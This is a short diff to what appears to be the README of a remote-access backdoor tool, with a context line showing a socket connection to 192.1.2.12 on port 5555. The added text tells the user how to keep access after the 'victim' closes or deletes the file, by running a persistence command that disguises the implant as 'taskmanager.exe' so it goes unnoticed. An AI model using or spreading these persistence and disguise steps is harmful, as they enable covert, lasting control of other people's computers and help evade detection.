@@ -51,4 +51,8 @@ s.connect(('192.1.2.12',5555))
 ### some processes develop differently in your Linux and Windows operating systems.
 ### programs have been deactivated because some processes cannot run at the same time even if they are written in both.
 ### You can customize the lines of code you can also activate the startup codes I use to see if it works.
-
+Even if the victim sees the file, closes it or removes it completely, write this code to your terminal after connecting to protect your connection
+```python
+persistence Hacked taskmanager.exe
+```
+you can change the name Hacked immediately noticeable taskmanager.exe is fine
